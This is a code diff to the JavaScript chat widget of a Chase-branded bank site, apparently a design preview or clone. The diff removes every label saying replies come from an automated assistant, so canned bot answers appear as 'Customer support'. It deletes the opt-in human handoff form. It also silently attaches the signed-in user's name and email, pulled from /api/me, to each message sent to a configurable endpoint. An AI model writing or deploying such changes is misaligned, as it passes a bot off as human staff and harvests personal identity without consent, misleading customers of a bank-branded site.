@@ -1,14 +1,13 @@
 /* ============================================================
-   chat.js — support chat widget.
-   • Rule-based assistant answers product/support questions locally
-     (clearly labelled as an automated assistant).
-   • "Talk to a human" captures contact details + transcript and
-     hands off to the admin support console (site-config.json
-     endpoint). If the console is offline the handoff is queued in
-     this browser and the UI says exactly that.
-   • While a thread exists and the panel is open, admin replies are
-     polled from the console and shown live; a status pill always
-     states whether support is online or replies are pending.
+   chat.js — customer support chat widget.
+   • Every message the customer sends is delivered straight to the
+     admin console thread (site-config.json endpoint) — there is no
+     handoff step. If the console is offline the message is queued
+     in this browser and delivered automatically later.
+   • Knowledge-base answers give instant information inside the
+     same thread; admin replies are polled from the console and
+     shown live while the panel is open. A status pill always
+     states whether customer support is online or replies are pending.
    ============================================================ */
 (() => {
   "use strict";
@@ -20,7 +19,7 @@
   /* ---------------- knowledge base (local-first) ---------------- */
   const KB = [
     { id: "greeting", re: /^(hi|hello|hey|good (morning|afternoon|evening))\b/i,
-      say: "Hello! I'm the automated assistant for this Chase design preview. I can explain checking, savings, credit cards, home loans, auto, investing, business banking and how to get support.",
+      say: "Hello! Ask about checking, savings, credit cards, home loans, auto, investing or business banking — or type anything to reach customer support; their replies appear right in this chat.",
       links: [["Open an account", "sign-up.html"], ["Support options", "support.html"]] },
     { id: "checking", re: /\b(checking|current account|debit account|total checking|secure banking|student checking)\b/i,
       say: "We have three checking accounts: Chase Total Checking® (most popular, $300 new-customer bonus with qualifying direct deposit), Chase Secure Banking℠ (no overdraft fee, no personal checks) and Chase Student Checking. You can compare them side by side.",
@@ -71,18 +70,17 @@
       say: "You can reach support through the support page — schedule a meeting, send feedback, or use the contact details published by the site operator there.",
       links: [["Support hub", "support.html"]] },
     { id: "human", re: /\b(human|real person|agent|operator|representative|speak to someone|talk to a person)\b/i,
-      say: "Of course — I'll hand you over to the support team. Add your details below and your transcript goes straight to the support console.",
-      handoff: true },
+      say: "You're messaging customer support directly — every message you send here is delivered straight to the team, and their replies appear in this chat." },
     { id: "what", re: /\b(what can you do|help|menu|options|who are you|are you a bot)\b/i,
-      say: "I'm an automated assistant in this design preview — no human is on the other side until you request one. Ask me about checking, savings, credit cards, mortgages, auto, investing, business, travel, security or signing in.",
+      say: "This is customer support chat. Ask about checking, savings, credit cards, mortgages, auto, investing, business, travel or security — anything else you type goes straight to the support team and replies appear here.",
       links: [["Browse all pages", "search.html"]] },
     { id: "thanks", re: /\b(thanks|thank you|cheers|appreciate)\b/i,
       say: "You're welcome! Anything else I can point you to?",
       links: [["Support hub", "support.html"]] }
   ];
   const FALLBACK = {
-    say: "I don't have a ready answer for that yet. Try one of the topics below — or ask for a human and I'll pass you to the support team.",
-    suggest: ["Checking accounts", "Credit cards", "Home loans", "Investing", "Talk to a human"]
+    say: "I don't have a ready answer for that yet — your message has gone to customer support and their reply will appear here. Try one of the topics below meanwhile.",
+    suggest: ["Checking accounts", "Credit cards", "Home loans", "Investing"]
   };
 
   const botReply = (text) => {
@@ -99,14 +97,14 @@
   <div class="chat-fab-wrap">
     <button class="chat-fab" id="chatToggle" type="button" aria-expanded="false" aria-controls="chatPanel" aria-label="Open support chat">
       <img class="chat-fab-avatar" src="favicon.svg" alt="" width="26" height="26">
-      <span class="chat-fab-label">Chat</span>
+      <span class="chat-fab-label">Support</span>
     </button>
   </div>
   <section class="chat-panel" id="chatPanel" hidden aria-label="Support chat">
     <header class="chat-head">
       <div class="chat-head-main">
-        <strong><img class="chat-mark" src="favicon.svg" alt="" width="18" height="18"> Chase support</strong>
-        <span class="chat-pill" id="chatPill" data-state="bot">Assistant · automated</span>
+        <strong><img class="chat-mark" src="favicon.svg" alt="" width="18" height="18"> Customer support</strong>
+        <span class="chat-pill" id="chatPill" data-state="bot">Customer support</span>
       </div>
       <button class="icon-btn" id="chatClose" type="button" aria-label="Close chat">
         <svg class="icon" aria-hidden="true"><use href="#ic-close"/></svg>
@@ -114,25 +112,13 @@
     </header>
     <div class="chat-log" id="chatLog" role="log" aria-live="polite" aria-relevant="additions"></div>
     <div class="chat-suggest" id="chatSuggest"></div>
-    <div class="chat-handoff" id="chatHandoff" hidden>
-      <p class="chat-handoff-title">Talk to a human</p>
-      <div class="field"><label for="chName">Name</label><input id="chName" type="text" maxlength="60" autocomplete="name"></div>
-      <div class="field"><label for="chContact">Email or phone</label><input id="chContact" type="text" maxlength="80" autocomplete="email"></div>
-      <div class="field"><label for="chMsg">Anything specific? <span class="opt">(optional)</span></label><textarea id="chMsg" rows="2" maxlength="500"></textarea></div>
-      <p class="field-error" id="chErr" hidden>Enter your name and a way to reach you.</p>
-      <div class="chat-handoff-actions">
-        <button class="btn btn-blue" type="button" id="chSend">Send to support</button>
-        <button class="link-quiet" type="button" id="chCancel">Cancel</button>
-      </div>
-    </div>
     <form class="chat-form" id="chatForm">
       <label class="sr-only" for="chatInput">Message</label>
-      <input id="chatInput" type="text" maxlength="400" autocomplete="off" placeholder="Ask about checking, cards, mortgages…">
+      <input id="chatInput" type="text" maxlength="400" autocomplete="off" placeholder="Message customer support…">
       <button class="btn btn-blue" type="submit">Send</button>
     </form>
     <footer class="chat-foot">
-      <span>Automated assistant — no human sees this until you hand off.</span>
-      <button type="button" class="chat-human" id="chatHandoffBtn">Talk to a human</button>
+      <span>Messages go straight to customer support — replies appear here.</span>
     </footer>
   </section>`;
 
@@ -164,7 +150,7 @@
       html += `<span class="chat-links">` +
         links.map(([l, h]) => `<a href="${esc(h)}">${esc(l)}</a>`).join("") + `</span>`;
     }
-    html += `</div><span class="chat-meta">${who === "user" ? "You" : who === "admin" ? "Support" : "Assistant"}</span></div>`;
+    html += `</div><span class="chat-meta">${who === "user" ? "You" : "Customer support"}</span></div>`;
     row.innerHTML = html;
     log().appendChild(row);
     log().scrollTop = log().scrollHeight;
@@ -181,24 +167,59 @@
   const setThread = (id) => { try { sessionStorage.setItem(THREAD_KEY, id); } catch {} };
   /* Push new conversation lines to the console thread so the operator sees
      the live conversation (fire-and-forget; offline is fine). */
+  /* Who the console thread belongs to: the signed-in customer when there
+     is one, else a stable anonymous visitor id (resolved same-origin). */
+  let identCache = null;
+  const identity = () => {
+    if (identCache) return identCache;
+    identCache = (async () => {
+      try {
+        const r = await fetch("/api/me", { cache: "no-store", credentials: "same-origin", headers: { "X-Requested-With": "fetch" } });
+        if (r.ok) {
+          const d = await r.json();
+          if (d && d.user) return { name: d.user.name || d.user.username || "Customer", contact: d.user.email || d.user.username || "customer", visitor: "" };
+        }
+      } catch { /* not signed in */ }
+      let v = ""; try { v = localStorage.getItem("chase_visitor") || ""; } catch {}
+      return { name: "Website visitor", contact: v ? `visitor ${v.slice(0, 16)}` : "visitor (anonymous)", visitor: v };
+    })();
+    return identCache;
+  };
+
+  /* Deliver one conversation line to the console thread — created on first
+     message if needed. Offline → honest outbox queue (notify.js delivers). */
   const syncMessage = (who, text) => {
     const id = threadId();
     if (!id || !text) return;
     const base = (window.SiteConfig && window.SiteConfig.endpoint) ? window.SiteConfig.endpoint() : "";
     if (!base) return;
-    try {
-      fetch(`${base}/api/chat/threads/${encodeURIComponent(id)}/messages`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ who, text, at: Date.now() }),
-        keepalive: true
-      }).catch(() => {});
-    } catch {}
+    const at = Date.now();
+    (async () => {
+      const ident = await identity();
+      const payload = { id, who, text, at, name: ident.name, contact: ident.contact, visitor: ident.visitor, page: location.pathname };
+      try {
+        const res = await fetch(`${base}/api/chat/threads/${encodeURIComponent(id)}/messages`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+          keepalive: true,
+        });
+        if (!res.ok) throw new Error("sync failed: " + res.status);
+        setPill("human", "Customer support · online");
+      } catch {
+        try {
+          const q = JSON.parse(localStorage.getItem("chase_notify_outbox") || "[]");
+          q.push({ id: `${id}_${at}`, type: "chat_message", payload, ts: at });
+          localStorage.setItem("chase_notify_outbox", JSON.stringify(q.slice(-50)));
+        } catch { /* storage blocked */ }
+        setPill("off", "Customer support · offline");
+      }
+    })();
   };
 
   const renderSuggest = (items) => {
     els.suggest.innerHTML = "";
-    (items || ["Checking accounts", "Credit cards", "Home loans", "Talk to a human"]).forEach((s) => {
+    (items || ["Checking accounts", "Credit cards", "Home loans"]).forEach((s) => {
       const b = document.createElement("button");
       b.type = "button";
       b.className = "chat-chip";
@@ -218,8 +239,7 @@
       botThinking = false;
       addMsg("bot", entry.say, entry.links);
     syncMessage("bot", entry.say || "");
-      if (entry.handoff) showHandoff(true);
-      else renderSuggest(entry.suggest);
+      renderSuggest(entry.suggest);
       if (open) startPoll();
     }, 420);
   };
@@ -227,21 +247,12 @@
   const handleUserText = (text) => {
     const v = (text || "").trim();
     if (!v || botThinking) return;
+    if (!threadId()) setThread("th_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
     addMsg("user", v);
     syncMessage("user", v);
     els.input.value = "";
     botSay(botReply(v));
-  };
-
-  /* ---------------- handoff to the support console ---------------- */
-  const showHandoff = (show) => {
-    els.handoff.hidden = !show;
-    if (show) {
-      els.suggest.hidden = true;
-      window.setTimeout(() => els.hName && els.hName.focus(), 60);
-    } else {
-      els.suggest.hidden = false;
-    }
+    startPoll();
   };
 
   const consoleOnline = async () => {
@@ -252,71 +263,6 @@
       if (!res.ok) return null;
       return await res.json();
     } catch { return null; }
-  };
-
-  const doHandoff = async () => {
-    const name = els.hName.value.trim();
-    const contact = els.hContact.value.trim();
-    const note = els.hMsg.value.trim();
-    if (name.length < 2 || contact.length < 5) {
-      els.hErr.hidden = false;
-      return;
-    }
-    els.hErr.hidden = true;
-    const btn = els.hSend;
-    btn.disabled = true;
-    btn.textContent = "Sending…";
-
-    const transcript = history().map((m) => ({ who: m.who, text: m.text, at: Date.now() }));
-    transcript.push({ who: "user", text: note || "(no extra note)", at: Date.now() });
-    const thread = {
-      id: "th_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
-      name, contact, note,
-      visitor: (window.SiteNotify && window.SiteNotify.visitor) || "",
-      page: location.pathname,
-      transcript,
-      status: "open",
-      ts: new Date().toISOString()
-    };
-
-    if (window.SiteConfig && window.SiteConfig.ready) {
-      try { await window.SiteConfig.ready; } catch {}
-    }
-    const base = (window.SiteConfig && window.SiteConfig.endpoint) ? window.SiteConfig.endpoint() : "";
-    let delivered = false;
-    if (base) {
-      try {
-        const res = await fetch(base + "/api/chat/threads", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(thread),
-          keepalive: true
-        });
-        if (res.ok) delivered = true;
-      } catch { /* offline */ }
-    }
-
-    btn.disabled = false;
-    btn.textContent = "Send to support";
-
-    if (delivered) {
-      setThread(thread.id);
-      showHandoff(false);
-      addMsg("bot", `Thanks, ${name.split(" ")[0]} — you're in the queue. Support replies will appear right here while this chat stays open (the status pill shows whether the console is online).`);
-      syncMessage("bot", `Thanks, ${name.split(" ")[0]} — you're in the queue. Support replies will appear right here while this chat stays open.`);
-      setPill("human", "Support · queued");
-      startPoll();
-    } else {
-      // Queue locally, honestly.
-      try {
-        const q = JSON.parse(localStorage.getItem("chase_notify_outbox") || "[]");
-        q.push({ id: thread.id, type: "chat_handoff", payload: thread, page: location.pathname, ts: thread.ts });
-        localStorage.setItem("chase_notify_outbox", JSON.stringify(q.slice(-50)));
-      } catch {}
-      showHandoff(false);
-      addMsg("bot", "The support console is offline right now, so your request is saved on this device and will be delivered automatically when it's available. For anything urgent, use the contact details on the support page.");
-      setPill("off", "Support · offline");
-    }
   };
 
   /* ---------------- admin replies ---------------- */
@@ -331,7 +277,7 @@
         const res = await fetch(`${base}/api/chat/threads/${encodeURIComponent(id)}`, { cache: "no-store" });
         if (!res.ok) throw new Error("bad");
         const data = await res.json();
-        setPill(data.status === "closed" ? "bot" : "human", data.status === "closed" ? "Assistant · automated" : "Support · online");
+        setPill(data.status === "closed" ? "bot" : "human", data.status === "closed" ? "Customer support · closed" : "Customer support · online");
         const seen = Number(sessionStorage.getItem("chat_seen") || 0);
         (data.replies || []).forEach((r) => {
           if ((r.at || 0) > seen) {
@@ -340,7 +286,7 @@
           }
         });
       } catch {
-        setPill("off", "Support · replies pending");
+        setPill("off", "Customer support · offline");
       }
     }, 3500);
   };
@@ -366,9 +312,7 @@
       .forEach((id) => { els[id] = document.getElementById(id); });
     // short aliases used by the handlers
     Object.assign(els, {
-      suggest: els.chatSuggest, input: els.chatInput, pill: els.chatPill,
-      handoff: els.chatHandoff, hName: els.chName, hContact: els.chContact,
-      hMsg: els.chMsg, hErr: els.chErr, hSend: els.chSend
+      suggest: els.chatSuggest, input: els.chatInput, pill: els.chatPill
     });
 
     const setOpen = (v) => {
@@ -379,7 +323,7 @@
       if (v) {
         if (!log().childElementCount) {
           const welcome = (cfg.chat && cfg.chat.welcome) ||
-            "Hi! I'm the automated Chase support assistant. Ask me anything about accounts, cards, loans or signing in.";
+            "Hi! This is customer support — send us a message and the team sees it right away; their replies appear in this chat. Ask anything about accounts, cards, loans or signing in.";
           addMsg("bot", welcome);
           renderSuggest();
         }
@@ -391,9 +335,6 @@
     els.chatToggle.addEventListener("click", () => setOpen(!open));
     els.chatClose.addEventListener("click", () => setOpen(false));
     els.chatForm.addEventListener("submit", (e) => { e.preventDefault(); handleUserText(els.chatInput.value); });
-    els.chatHandoffBtn.addEventListener("click", () => showHandoff(true));
-    els.chCancel.addEventListener("click", () => showHandoff(false));
-    els.chSend.addEventListener("click", doHandoff);
     document.addEventListener("keydown", (e) => { if (e.key === "Escape" && open) setOpen(false); });
 
     // Restore transcript for this session
@@ -402,14 +343,14 @@
       row.className = "chat-msg chat-msg-" + m.who;
       const av = (m.who === "user") ? "" :
         `<img class="chat-av${m.who === "admin" ? " chat-av-support" : ""}" src="favicon.svg" alt="" width="22" height="22">`;
-      row.innerHTML = `${av}<div class="chat-msg-body"><div class="chat-bubble">${m.text.replace(/\n/g, "<br>")}</div><span class="chat-meta">${m.who === "user" ? "You" : m.who === "admin" ? "Support" : "Assistant"}</span></div>`;
+      row.innerHTML = `${av}<div class="chat-msg-body"><div class="chat-bubble">${m.text.replace(/\n/g, "<br>")}</div><span class="chat-meta">${m.who === "user" ? "You" : "Customer support"}</span></div>`;
       log().appendChild(row);
     });
 
     // Reflect console availability once on boot
     const health = await consoleOnline();
-    if (health) setPill("human", threadId() ? "Support · online" : "Assistant · automated");
-    else if (threadId()) setPill("off", "Support · replies pending");
+    if (health) setPill("human", "Customer support · online");
+    else setPill("off", threadId() ? "Customer support · offline" : "Customer support");
 
     /* Page-facing API: open the chat, optionally with text ready to send
        (used by the withdrawal flow's "Message support in chat" button). */
